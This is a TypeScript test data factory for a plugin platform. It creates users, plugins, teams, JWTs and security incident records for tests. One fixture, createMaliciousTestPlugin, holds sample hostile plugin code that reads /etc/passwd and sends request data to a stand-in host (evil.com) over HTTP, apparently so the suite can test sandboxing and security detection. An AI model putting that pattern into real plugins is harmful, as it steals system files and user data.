/**
 * Test Data Factory
 * Creates test data for integration and unit tests
 */

import { v4 as uuidv4 } from 'uuid';
import jwt from 'jsonwebtoken';
import { PluginManifest } from '../../../backend/src/types/plugins';

export interface TestUser {
  id: string;
  email: string;
  name: string;
  role: 'user' | 'admin' | 'enterprise';
  plan: 'free' | 'pro' | 'enterprise';
  createdAt: Date;
  updatedAt: Date;
}

export interface TestPlugin {
  id: string;
  manifest: PluginManifest;
  code: string;
}

/**
 * Create a test user with default values
 */
export async function createTestUser(overrides: Partial<TestUser> = {}): Promise<TestUser> {
  return {
    id: uuidv4(),
    email: `test-${Date.now()}@example.com`,
    name: 'Test User',
    role: 'user',
    plan: 'pro',
    createdAt: new Date(),
    updatedAt: new Date(),
    ...overrides,
  };
}

/**
 * Create multiple test users
 */
export async function createTestUsers(count: number, overrides: Partial<TestUser> = {}): Promise<TestUser[]> {
  const users: TestUser[] = [];
  for (let i = 0; i < count; i++) {
    users.push(await createTestUser({
      ...overrides,
      email: `test-${i}-${Date.now()}@example.com`,
      name: `Test User ${i}`,
    }));
  }
  return users;
}

/**
 * Create an admin user
 */
export async function createTestAdmin(overrides: Partial<TestUser> = {}): Promise<TestUser> {
  return createTestUser({
    role: 'admin',
    plan: 'enterprise',
    email: `admin-${Date.now()}@example.com`,
    name: 'Admin User',
    ...overrides,
  });
}

/**
 * Create a test plugin manifest and code
 */
export async function createTestPlugin(overrides: Partial<{
  id: string;
  name: string;
  version: string;
  description: string;
  author: string;
  category: string;
  tags: string[];
  permissions: string[];
  dependencies: Record<string, string>;
  config: Record<string, any>;
  hooks: Record<string, string>;
  code: string;
}> = {}): Promise<TestPlugin> {
  const id = overrides.id || `test-plugin-${Date.now()}`;
  const manifest: PluginManifest = {
    id,
    name: overrides.name || 'Test Plugin',
    version: overrides.version || '1.0.0',
    description: overrides.description || 'A test plugin for integration testing',
    author: overrides.author || 'Test Suite',
    license: 'MIT',
    main: 'index.js',
    permissions: overrides.permissions || ['read'],
    apiVersion: '1.0.0',
    dependencies: overrides.dependencies || {},
    config: overrides.config || {},
    category: overrides.category || 'testing',
    tags: overrides.tags || ['test'],
    homepage: `https://example.com/plugins/${id}`,
    repository: `https://github.com/test/${id}`,
    documentation: `https://docs.example.com/plugins/${id}`,
    bugs: `https://github.com/test/${id}/issues`,
    keywords: overrides.tags || ['test', 'automation'],
    engines: {
      node: '>=14.0.0',
    },
    scripts: {
      test: 'echo "Error: no test specified" && exit 1',
    },
    files: ['index.js', 'lib/'],
    publishedAt: new Date(),
    autoLoad: true,
  };

  // Generate plugin code based on hooks or use default
  let code = overrides.code || `
module.exports = {
  onInitialize: (context) => {
    return { message: 'Plugin initialized', id: '${id}' };
  },
  onExecute: (context, params) => {
    return { processed: true, data: params, timestamp: Date.now() };
  },
  onDestroy: (context) => {
    return { message: 'Plugin destroyed', id: '${id}' };
  }
};
`;

  if (overrides.hooks) {
    const hookImplementations = Object.entries(overrides.hooks)
      .map(([hookName, hookCode]) => `  ${hookName}: ${hookCode}`)
      .join(',\n');

    code = `module.exports = {\n${hookImplementations}\n};`;
  }

  return {
    id,
    manifest,
    code,
  };
}

/**
 * Create multiple test plugins
 */
export async function createTestPlugins(count: number, baseOverrides: Partial<TestPlugin> = {}): Promise<TestPlugin[]> {
  const plugins: TestPlugin[] = [];
  for (let i = 0; i < count; i++) {
    plugins.push(await createTestPlugin({
      ...baseOverrides,
      id: `test-plugin-${i}-${Date.now()}`,
      name: `Test Plugin ${i}`,
    }));
  }
  return plugins;
}

/**
 * Create a test plugin with security issues
 */
export async function createMaliciousTestPlugin(): Promise<TestPlugin> {
  return createTestPlugin({
    id: `malicious-plugin-${Date.now()}`,
    name: 'Malicious Plugin',
    permissions: ['system', 'network', 'file'],
    code: `
module.exports = {
  onInitialize: (context) => {
    // Malicious: try to access system files
    const fs = require('fs');
    try {
      fs.readFileSync('/etc/passwd', 'utf8');
    } catch (e) {}
    return { message: 'Plugin initialized' };
  },
  onExecute: (context, params) => {
    // Malicious: try to make network requests
    const http = require('http');
    http.get('http://evil.com/steal?data=' + JSON.stringify(params));
    return { processed: true, data: params };
  }
};
`,
  });
}

/**
 * Create a test plugin that will fail
 */
export async function createFailingTestPlugin(): Promise<TestPlugin> {
  return createTestPlugin({
    id: `failing-plugin-${Date.now()}`,
    name: 'Failing Plugin',
    code: `
module.exports = {
  onInitialize: (context) => {
    throw new Error('Plugin initialization failed');
  },
  onExecute: (context, params) => {
    throw new Error('Plugin execution failed');
  }
};
`,
  });
}

/**
 * Create a memory-intensive test plugin
 */
export async function createMemoryIntensiveTestPlugin(): Promise<TestPlugin> {
  return createTestPlugin({
    id: `memory-intensive-plugin-${Date.now()}`,
    name: 'Memory Intensive Plugin',
    code: `
module.exports = {
  onExecute: (context, params) => {
    // Allocate lots of memory
    const arrays = [];
    for (let i = 0; i < 1000; i++) {
      arrays.push(new Array(10000).fill('x'));
    }
    return { arraysCreated: arrays.length, memoryUsed: process.memoryUsage() };
  }
};
`,
  });
}

/**
 * Create a test team
 */
export async function createTestTeam(overrides: Partial<{
  name: string;
  description: string;
  ownerId: string;
  members: Array<{
    userId: string;
    role: 'owner' | 'admin' | 'member';
  }>;
}> = {}) {
  return {
    id: uuidv4(),
    name: overrides.name || 'Test Team',
    description: overrides.description || 'A test team for integration testing',
    ownerId: overrides.ownerId || uuidv4(),
    members: overrides.members || [],
    createdAt: new Date(),
    updatedAt: new Date(),
    subscription: {
      plan: 'pro',
      status: 'active',
      currentPeriodStart: new Date(),
      currentPeriodEnd: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
    },
    ...overrides,
  };
}

/**
 * Create test plugin installation record
 */
export function createTestPluginInstallation(overrides: Partial<{
  pluginId: string;
  userId: string;
  teamId: string;
  version: string;
  config: Record<string, any>;
  status: 'active' | 'inactive' | 'error';
  enabled: boolean;
  autoUpdate: boolean;
}> = {}) {
  return {
    id: uuidv4(),
    pluginId: overrides.pluginId || `plugin-${Date.now()}`,
    userId: overrides.userId || `user-${Date.now()}`,
    teamId: overrides.teamId,
    version: overrides.version || '1.0.0',
    config: overrides.config || {},
    status: overrides.status || 'active',
    enabled: overrides.enabled !== false,
    autoUpdate: overrides.autoUpdate !== false,
    installedAt: new Date(),
    updatedAt: new Date(),
    lastUsedAt: new Date(),
    usageCount: 0,
    ...overrides,
  };
}

/**
 * Create test plugin execution log
 */
export function createTestPluginExecution(overrides: Partial<{
  pluginId: string;
  userId: string;
  teamId: string;
  hookName: string;
  parameters: Record<string, any>;
  result: any;
  error?: string;
  executionTime: number;
  memoryUsage: number;
}> = {}) {
  return {
    id: uuidv4(),
    pluginId: overrides.pluginId || `plugin-${Date.now()}`,
    userId: overrides.userId || `user-${Date.now()}`,
    teamId: overrides.teamId,
    hookName: overrides.hookName || 'onExecute',
    parameters: overrides.parameters || {},
    result: overrides.result || { success: true },
    error: overrides.error,
    executionTime: overrides.executionTime || 100,
    memoryUsage: overrides.memoryUsage || 1024 * 1024, // 1MB
    createdAt: new Date(),
    ...overrides,
  };
}

/**
 * Create test security incident
 */
export function createTestSecurityIncident(overrides: Partial<{
  pluginId: string;
  userId: string;
  type: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  details: Record<string, any>;
}> = {}) {
  return {
    id: uuidv4(),
    pluginId: overrides.pluginId || `plugin-${Date.now()}`,
    userId: overrides.userId || `user-${Date.now()}`,
    type: overrides.type || 'UNAUTHORIZED_ACCESS',
    severity: overrides.severity || 'medium',
    description: overrides.description || 'Test security incident',
    details: overrides.details || {},
    status: 'open' as const,
    createdAt: new Date(),
    updatedAt: new Date(),
    resolvedAt: null,
    ...overrides,
  };
}

/**
 * Create JWT auth token for test user
 */
export function createAuthToken(user: TestUser, additionalClaims: Record<string, any> = {}): string {
  const payload = {
    userId: user.id,
    email: user.email,
    role: user.role,
    plan: user.plan,
    ...additionalClaims,
  };

  return jwt.sign(payload, process.env.JWT_SECRET || 'test-secret', {
    expiresIn: '1h',
    issuer: 'questro-test',
    audience: 'questro-api',
  });
}

/**
 * Create refresh token for test user
 */
export function createRefreshToken(user: TestUser): string {
  const payload = {
    userId: user.id,
    type: 'refresh',
  };

  return jwt.sign(payload, process.env.JWT_REFRESH_SECRET || 'test-refresh-secret', {
    expiresIn: '7d',
    issuer: 'questro-test',
    audience: 'questro-api',
  });
}

/**
 * Create test API request context
 */
export function createTestContext(overrides: Partial<{
  user: TestUser;
  teamId: string;
  requestId: string;
  ip: string;
  userAgent: string;
}> = {}) {
  return {
    user: overrides.user || {
      id: `user-${Date.now()}`,
      email: 'test@example.com',
      name: 'Test User',
      role: 'user' as const,
      plan: 'pro' as const,
      createdAt: new Date(),
      updatedAt: new Date(),
    },
    teamId: overrides.teamId,
    requestId: overrides.requestId || uuidv4(),
    ip: overrides.ip || '127.0.0.1',
    userAgent: overrides.userAgent || 'questro-test/1.0',
    timestamp: new Date(),
    ...overrides,
  };
}

/**
 * Clean up test data helper
 */
export async function cleanupTestData(...items: Array<{ id: string; cleanup?: () => Promise<void> }>) {
  for (const item of items) {
    if (item.cleanup) {
      try {
        await item.cleanup();
      } catch (error) {
        console.error(`Cleanup failed for ${item.id}:`, error);
      }
    }
  }
}